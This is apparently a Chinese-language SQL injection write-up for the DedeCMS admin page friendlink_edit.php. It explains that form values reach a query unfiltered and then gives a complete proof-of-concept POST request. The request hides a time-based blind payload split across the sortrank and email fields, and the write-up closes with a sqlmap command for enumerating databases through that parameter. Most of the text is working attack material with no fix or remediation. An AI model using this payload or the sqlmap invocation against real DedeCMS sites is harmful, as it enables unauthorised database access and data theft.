漏洞一 SQL注入

路由地址： /dede/friendlink_edit.php 

找到可控变量 $webname;

发现if条件语句

 

发现这是else if($dopost=="saveedit")循环条件

 

进入 init（）、item（）

 

这段 PHP 代码定义了一个类中的 Init() 方法，其作用是从 $_POST 和 $_GET 中提取用户提交的表单数据，并分别保存到类的属性中。


这段代码的意思是从 $this->forms 中获取指定名称的表单字段值，如果不存在，则返回默认值。

由此可见，对参数没有过滤，但是由于页面没有回显，尝试时间盲注来判断，语句是否执行有效。

 

 

 

Poc

POST /dede/friendlink_edit.php HTTP/1.1

Host: zm.cms

Content-Length: 1290

Cache-Control: max-age=0

Origin: http://zm.cms

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryy9ctvlOoiOQK7mbA

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://zm.cms/dede/friendlink_edit.php?id=9&dopost=getedit

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: menuitems=1_1%2C2_1%2C3_1; PHPSESSID=130cevhlnoej4dcsg1stootrap; DedeUserID=1; _csrf_name_f1c32558=4a819cbdba87ed37850602f6ac761737; _csrf_name_f1c325581BH21ANI1AGD297L1FF21LN02BGE1DNG=9fe9063907af3554; DedeUserID1BH21ANI1AGD297L1FF21LN02BGE1DNG=4ab7784072cbcbf3; DedeLoginTime=1751956169; DedeLoginTime1BH21ANI1AGD297L1FF21LN02BGE1DNG=313c73668fd8b3ea; ENV_GOBACK_URL=%2Fdede%2Ffriendlink_main.php

Connection: close

 

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="id"

 

9

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="dopost"

 

saveedit

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="url"

 

http://docs.dedecms.com/

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="sortrank"

 

'or sleep(5)/*'

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="webname"

 

DedeCMS维基手册

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="logo"

 

 

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="logoimg"; filename=""

Content-Type: application/octet-stream

 

 

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="msg"

 

 

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="email"

 

'*/-- -

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="ischeck"

 

2

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="typeid"

 

1

------WebKitFormBoundaryy9ctvlOoiOQK7mbA

Content-Disposition: form-data; name="Submit"

 

 提 交 

------WebKitFormBoundaryy9ctvlOoiOQK7mbA--

 

 

 

进行sql测试

python3 sqlmap.py -r url.txt --dbs --batch -p sortrank --level 5 --risk 3

 

 

 

 

 